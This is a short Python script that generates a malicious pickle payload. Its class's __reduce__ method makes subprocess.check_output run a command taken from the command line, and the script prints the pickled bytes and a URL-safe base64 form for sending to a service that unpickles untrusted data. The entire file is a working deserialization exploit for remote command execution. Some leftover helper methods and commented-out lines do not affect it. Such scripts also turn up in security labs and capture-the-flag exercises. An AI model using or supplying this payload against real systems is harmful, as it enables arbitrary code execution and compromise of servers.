import pickle
import base64
import sys
import subprocess
import os

class PICKLEREQUEST():
        def __init__(self, cmd):
                self.cmd = cmd
         
        def __reduce__(self):
                    return (subprocess.check_output, ([*self.cmd.split(' '),],))
        def command64(self, cmdsplit):
                    pickled = pickle.dumps(cmdsplit)
                    self.string64 = base64.urlsafe_b64encode(pickled)
        def get_string64(self):
            print (self.string64)
            
                    

command = sys.argv[1]
pickled = pickle.dumps(PICKLEREQUEST(command))
string64 = base64.urlsafe_b64encode(pickled)
print(f"string not base64{pickled}")
print(f"string base64 {string64}")

#command64pickled = PICKLEREQUEST.command64(cmdsplit) 
#print (f"command: {command64pickled}")


